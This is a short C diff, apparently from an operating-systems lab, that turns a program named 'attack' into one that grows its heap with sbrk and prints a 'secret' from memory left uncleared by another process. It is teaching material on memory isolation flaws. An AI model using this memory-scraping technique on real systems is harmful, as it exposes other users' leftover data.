@@ -6,11 +6,13 @@
 int
 main(int argc, char *argv[])
 {
-  #define PGSIZE 4096
-  char *buf = malloc(PGSIZE);
-  for (int i = 0; i < PGSIZE - 8; i++) {
-    write(2, buf + i, 8);
+  if (argc != 1) {
+    printf("Usage: attack\n");
+    exit(1);
   }
-  free(buf);
+  char *end = sbrk(PGSIZE*32);
+  end = end + 16 * PGSIZE;
+  printf("secret: %s\n", end+32);
+  write(2, end+32, 8);
   exit(0);
 }
